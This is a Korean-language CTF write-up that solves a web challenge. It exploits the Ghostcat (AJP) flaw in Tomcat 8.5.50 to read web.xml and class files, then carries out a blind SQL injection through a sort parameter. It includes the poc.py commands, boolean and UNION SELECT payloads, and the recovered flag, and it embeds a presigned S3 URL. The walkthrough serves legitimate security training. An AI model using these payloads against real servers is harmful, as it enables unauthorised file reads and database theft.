# poc

- url : http://ctf.ssat.site:31888/demo/

![poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled.png](poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled.png)

- error page

![poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%201.png](poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%201.png)

- URL : [http://ctf.ssat.site:31888/demo/getGochaList?sortName=poke_name&sortFlag=asc](http://ctf.ssat.site:31888/demo/getGochaList?sortName=poke_name&sortFlag=asc)

![poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%202.png](poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%202.png)

- DirBuster → docs 접근 가능한 경로
- 서버 버전 노출

![poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%203.png](poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%203.png)

- 8.5.50에 존재하는 ghostcat 취약점이 존재하고  AJP PORT 31811이 열려있는것을 확인

[poc.py](poc%20116b2ba746ea44b9bd0a1c059467fb0d/poc.py)

```bash
python poc.py -p 31811 -f "/WEB-INF/web.xml" 127.0.0.1
python poc.py -p 31811 -f "/WEB-INF/classes/com/samsung/sctf/MainController.class" 127.0.0.1
python poc.py -p 31811 -f "/WEB-INF/classes/com/samsung/sctf/gochaMapper.class" 127.0.0.1
python poc.py -p 31811 -f "/WEB-INF/demo/WEB-INF/classes/mapper/gochaMapper.xml" 127.0.0.1

```
![https://s3.us-west-2.amazonaws.com/secure.notion-static.com/6b56cba1-478b-4139-b2c0-dd6635d495f5/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210722%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210722T134635Z&X-Amz-Expires=86400&X-Amz-Signature=12d56b70b41356175632f65c4c88336498827b1c71e8db1f36d7339462a64994&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/6b56cba1-478b-4139-b2c0-dd6635d495f5/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210722%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210722T134635Z&X-Amz-Expires=86400&X-Amz-Signature=12d56b70b41356175632f65c4c88336498827b1c71e8db1f36d7339462a64994&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)
- <servlet-class>com.samsung.sctf.MainController</servlet-class> 를 참고해서 클래스 파일들을 ghostcat 취약점으로 READ.

- ghost cat PoC 를 통해서 WEB-INF/web.xml을 요청 servlet-class

![poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%204.png](poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%204.png)

- <servlet-class>com.samsung.sctf.MainController</servlet-class> 바탕으로 클래스 파일을 가져옴
- /WEB-INF/classes/com/samsung/sctf/MainController.class → Decompile

![poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%205.png](poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%205.png)

- /WEB-INF/classes/com/samsung/sctf/gochaMapper.class → Decompile

![poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%206.png](poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%206.png)

- /WEB-INF/classes/mapper/gochaMapper.xml 매퍼 확인, sqli 가능 여부 확인

![poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%207.png](poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%207.png)

- BlindSQL Injection
- True false 확인
    - True

    ```bash
    sortName=(case%20when%20(select%20true)%20then%20BID%20else%20%270%27%20end)&sortFlag=desc
    sortName=(case when (select true) then poke_name else '0' end)&sortFlag=asc

    ```

    ![poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%208.png](poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%208.png)

    - false

    ```bash
    sortName=(case%20when%20(select%20false)%20then%20BID%20else%20%270%27%20end)&sortFlag=desc
    sortName=(case when (select false) then poke_name else '0' end)&sortFlag=asc
    ```

![poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%209.png](poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%209.png)

- index 위치 찾기

```bash
sortName : random())dummy UNION SELECT'A','B','C','D','D','F',now(),'G','H','I' FROM(SELECT 1
sortFlag : NULL
```

![poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%2010.png](poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%2010.png)

- flag 조회하기

```bash
sortName : random())dummy UNION SELECT DD."index",DD."name",DD.first_attribute,DD.second_attribute,'XX','XX',now(),'XX','XX','XX' FROM( SELECT * from poke_info 
sortFlag : ""
```

![poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%2011.png](poc%20116b2ba746ea44b9bd0a1c059467fb0d/Untitled%2011.png)

```bash
flag = {G0tcH4_Gh0sT_c4t_iS_L3G3ND4Ry_P0k3}
```
